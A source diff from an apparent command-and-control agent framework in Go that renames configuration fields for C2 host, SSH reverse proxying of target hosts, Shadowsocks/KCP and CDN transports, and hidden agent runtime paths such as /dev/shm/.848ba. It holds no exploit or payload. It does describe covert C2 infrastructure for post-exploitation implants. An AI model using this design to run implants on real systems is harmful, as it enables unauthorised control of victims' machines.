@@ -15,9 +15,9 @@ func ReadJSONConfig(jsonData []byte, config_to_write *Config) (err error) {
 		return fmt.Errorf("failed to parse JSON config: %v", err)
 	}
 	calculateReverseProxyPort := func() string {
-		p, err := strconv.Atoi(config_to_write.ProxyPort)
+		p, err := strconv.Atoi(config_to_write.AutoProxyPort)
 		if err != nil {
-			log.Printf("WTF? ProxyPort %s: %v", config_to_write.ProxyPort, err)
+			log.Printf("WTF? ProxyPort %s: %v", config_to_write.AutoProxyPort, err)
 			return "22222"
 		}
 
@@ -25,7 +25,7 @@ func ReadJSONConfig(jsonData []byte, config_to_write *Config) (err error) {
 		rProxyPortInt := p + 1
 		return strconv.Itoa(rProxyPortInt)
 	}
-	config_to_write.ReverseProxyPort = calculateReverseProxyPort()
+	config_to_write.SSHProxyPort = calculateReverseProxyPort()
 
 	// these variables are decided by other variables
 	CCAddress = fmt.Sprintf("https://%s", config_to_write.CCHost)
@@ -38,31 +38,31 @@ func ReadJSONConfig(jsonData []byte, config_to_write *Config) (err error) {
 
 // Config build.json config file
 type Config struct {
-	CCPort               string `json:"cc_port"`                // "cc_port": "5381",
-	ProxyPort            string `json:"proxy_port"`             // "proxy_port": "56238",
-	HTTPListenerPort     string `json:"http_listner_port"`      // "http_listener_port": "1313"
+	CCPort               string `json:"cc_port"`                // CC service port, TLS enabled
+	AutoProxyPort        string `json:"autoproxy_port"`         // Socks proxy port for auto proxy feature
+	HTTPListenerPort     string `json:"http_listner_port"`      // For stager HTTP server
 	ShadowsocksPassword  string `json:"shadowsocks_password"`   // password of shadowsocks proxy server
 	ShadowsocksPort      string `json:"shadowsocks_port"`       // server port of shadowsocks proxy server
 	KCPPort              string `json:"kcp_port"`               // server port of kcp server
 	UseShadowsocks       bool   `json:"use_shadowsocks"`        // enable shadowsocks proxy server for C2 transport
 	UseKCP               bool   `json:"use_kcp"`                // enable KCP for Shadowsocks C2 transport
-	ReverseProxyPort     string `json:"reverse_proxy_port"`     // "reverse_proxy_port": "56239",
-	SSHDPort             string `json:"sshd_port"`              // "sshd_port": "2222",
-	BroadcastPort        string `json:"broadcast_port"`         // "broadcast_port": "58485",
+	SSHProxyPort         string `json:"ssh_proxy_port"`         // Port of SSH proxy server, used to bring target host to C2, see Bring2CC
+	SSHDPort             string `json:"sshd_port"`              // ssh related services
+	BroadcastPort        string `json:"broadcast_port"`         // UDP port used for broadcasting msg
 	BroadcastIntervalMin int    `json:"broadcast_interval_min"` // seconds, set max to 0 to disable
 	BroadcastIntervalMax int    `json:"broadcast_interval_max"` // seconds, set max to 0 to disable
-	CCHost               string `json:"ccip"`                   // "ccip": "192.168.40.137",
-	PIDFile              string `json:"pid_file"`               // "pid_file": ".848ba.pid",
+	CCHost               string `json:"cc_host"`                // Address of C2 server
+	PIDFile              string `json:"pid_file"`               // PID of agent process
 	CCIndicator          string `json:"cc_indicator"`           // URL of CC indicator
 	IndicatorWaitMin     int    `json:"indicator_wait_min"`     // seconds
 	IndicatorWaitMax     int    `json:"indicator_wait_max"`     // seconds, set max to 0 to disable
 	CCIndicatorText      string `json:"indicator_text"`         // what to send in response when indicator URL is requested
 	CA                   string `json:"ca"`                     // CA cert from server side
-	AgentProxy           string `json:"agent_proxy"`            // proxy for C2 transport
+	C2TransportProxy     string `json:"c2transport_proxy"`      // proxy for C2 transport
 	CDNProxy             string `json:"cdn_proxy"`              // websocket proxy, see go-cdn2proxy
 	DoHServer            string `json:"doh_server"`             // DNS over HTTPS server, for name resolving
 	SocketName           string `json:"socket"`                 // agent socket, use this to check agent status
-	AgentRoot            string `json:"agent_root"`             // "agent_root": "/dev/shm/.848ba",
+	AgentRoot            string `json:"agent_root"`             // Where to store agent runtime files, default to /tmp
 	UtilsPath            string `json:"utils_path"`             // where to store `vaccine` files
 	AgentUUID            string `json:"agent_uuid"`             // UUID of agent
 	AgentTag             string `json:"agent_tag"`              // generated from UUID, will be used to identidy agents
